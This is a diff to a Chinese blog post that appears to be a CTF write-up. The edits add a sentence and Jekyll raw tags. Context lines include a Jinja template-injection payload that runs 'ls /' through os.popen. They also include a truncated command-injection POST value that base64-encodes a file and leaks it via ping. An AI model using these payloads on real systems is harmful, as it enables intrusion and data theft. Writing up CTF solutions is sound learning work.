@@ -8,11 +8,13 @@ description:
 excerpt_separator: <!-- more -->
 ---
 
-上周末BJD第二场，又是一届新生赛，尽管如此还是暴露出了很多问题。
+上周末BJD第二场，又是一届新生赛，尽管如此还是暴露出了很多问题。这段时间就先把这次总结出来的问题解决一下。
 
 <!-- more -->
 
 # fake google
+
+{% raw %}
 
 ## 题目描述
 
@@ -57,6 +59,9 @@ P3's girlfirend is : foo
     ```
     ?name={{ config.class.init.globals['os'].popen('ls /').read() }}
     ```
+    
+
+{% endraw %}
 
 ----
 
@@ -152,8 +157,6 @@ POST：girl_friend=php -r "system('ping '.substr(system('bas""e64 /etc/demo/P3rh
 3. 不得不说，上面这个方法太蛋疼了，得整一个VPS工具。
 
 ----
-
-
 
 # 简单注入
 
